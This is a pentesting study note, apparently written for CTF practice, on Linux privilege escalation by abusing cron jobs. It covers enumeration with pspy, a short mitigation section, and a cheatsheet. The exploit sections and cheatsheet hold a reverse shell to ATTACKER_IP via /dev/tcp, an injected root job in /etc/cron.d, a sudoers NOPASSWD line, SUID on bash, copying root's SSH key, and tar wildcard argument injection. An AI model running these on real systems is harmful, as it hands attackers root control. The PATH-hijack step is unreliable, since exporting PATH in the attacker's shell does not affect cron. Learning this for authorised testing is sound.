# Linux Privilege Escalation – Cron Job Abuse

## Overview

Cron jobs automate repetitive system tasks such as:

- backups
- log rotation
- system cleanup
- script execution
- service monitoring

Cron jobs often execute with **elevated privileges (root)**, making them valuable privilege escalation targets when misconfigured.

Common cron locations:

```bash
/etc/crontab
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/etc/cron.weekly/
/etc/cron.monthly/
/var/spool/cron/
/var/spool/cron/crontabs/
```

---

# Cron Job Format

Each cron entry contains:

```text
* * * * * command
│ │ │ │ │
│ │ │ │ └── day of week
│ │ │ └──── month
│ │ └────── day of month
│ └──────── hour
└────────── minute
```

Example:

```bash
0 */12 * * * /home/admin/backup.sh
```

Runs every 12 hours.

---

# Why Cron Jobs Are Dangerous

Privilege escalation opportunities arise when:

- cron scripts are writable
- cron directories are writable
- executed binaries are writable
- relative paths are used
- wildcard characters are used
- environment variables are insecure
- scripts call external binaries insecurely

Because cron jobs often run as root, injected commands execute with full privileges.

---

# Enumerating Cron Jobs

Search cron directories:

```bash
ls -la /etc/cron*
cat /etc/crontab
crontab -l
```

Check user cron jobs:

```bash
ls /var/spool/cron
```

Search writable cron files:

```bash
find / -type f -perm -o+w 2>/dev/null
```

Example discovery:

```text
/dmz-backups/backup.sh
/etc/cron.daily/backup
/home/backupsvc/backup.sh
```

---

# Identifying Cron Activity

Cron activity may be inferred from:

- timestamps
- file creation frequency
- log entries
- running processes

Example backup directory:

```bash
ls -la /dmz-backups/
```

Output:

```text
www-backup-2020831-02:24:01.tgz
www-backup-2020831-02:27:01.tgz
www-backup-2020831-02:30:01.tgz
```

Indicates execution every 3 minutes:

```text
*/3 * * * *
```

Likely intended:

```text
0 */3 * * *
```

Common misconfiguration.

---

# Using pspy to Monitor Cron Jobs

pspy monitors processes without root privileges.

Run:

```bash
./pspy64 -pf -i 1000
```

Example output:

```text
UID=0 PID=2201 | /bin/bash /dmz-backups/backup.sh
UID=0 PID=2204 | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup.tgz /var/www/html
```

Confirms script runs as root.

---

# Exploiting Writable Cron Scripts

Example vulnerable script:

```bash
#!/bin/bash

SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz

tar --absolute-names \
--create \
--gzip \
--file=$DESTDIR$FILENAME \
$SRCDIR
```

Script runs as root.

Writable by user:

```bash
-rwxrwxrwx 1 root root backup.sh
```

---

# Exploit Method – Reverse Shell Injection

Append payload:

```bash
cp backup.sh backup.sh.bak
```

Modify script:

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1' >> backup.sh
```

Start listener:

```bash
nc -lnvp 443
```

Wait for cron execution.

Root shell received:

```bash
uid=0(root)
```

---

# Alternative Payloads

## Add SUID bash

```bash
chmod +s /bin/bash
```

Execute:

```bash
/bin/bash -p
```

---

## Add user to sudoers

```bash
echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```

---

## Copy SSH key

```bash
cp /root/.ssh/id_rsa /tmp/
```

---

# Cron Directory Abuse

Writable cron directories allow direct job injection:

```bash
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"' > /etc/cron.d/exploit
```

---

# PATH Abuse via Cron

If script uses relative paths:

```bash
tar cf backup.tar *
```

Create malicious binary:

```bash
echo '/bin/bash' > tar
chmod +x tar
export PATH=.:$PATH
```

Wait for execution.

---

# Wildcard Abuse via Cron

If script contains:

```bash
tar -czf backup.tar *
```

Inject malicious filenames:

```bash
echo "" > --checkpoint=1
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

---

# Common Cron Misconfigurations

| Issue | Risk |
|------|------|
| world-writable scripts | command injection |
| writable cron directories | arbitrary job execution |
| wildcard usage | argument injection |
| relative paths | PATH hijacking |
| insecure permissions | privilege abuse |
| weak ownership | script modification |
| improper scheduling | frequent execution opportunities |

---

# Enumeration Checklist

## Identify cron jobs

```bash
cat /etc/crontab
ls -la /etc/cron*
```

---

## Identify writable scripts

```bash
find / -type f -perm -o+w 2>/dev/null
```

---

## Monitor cron execution

```bash
pspy64
```

---

## Identify frequent file creation

```bash
ls -lt
```

---

## Identify root-executed scripts

```bash
ps aux | grep cron
```

---

# Defensive Mitigation

Best practices:

- restrict script write permissions
- enforce least privilege
- use absolute paths
- avoid wildcard usage
- restrict cron directory access
- monitor cron execution logs
- validate script ownership
- avoid running scripts from writable directories

Secure permissions:

```bash
chmod 700 script.sh
chown root:root script.sh
```

---

# Quick Cron Abuse Cheatsheet

```bash
cat /etc/crontab

ls -la /etc/cron*

find / -type f -perm -o+w 2>/dev/null

./pspy64

echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> script.sh

nc -lnvp 443
```

---

# Key Takeaways

- cron jobs frequently execute with root privileges
- writable scripts allow command injection
- pspy enables cron monitoring without root access
- wildcard and PATH misconfigurations increase risk
- frequent cron execution accelerates exploitation
- cron misconfigurations are common in real environments
- always enumerate cron jobs during privilege escalation

---

# Tags

#linux
#privilege-escalation
#cron
#scheduled-tasks
#post-exploitation
#enumeration
#ctf
#pentesting
#obsidian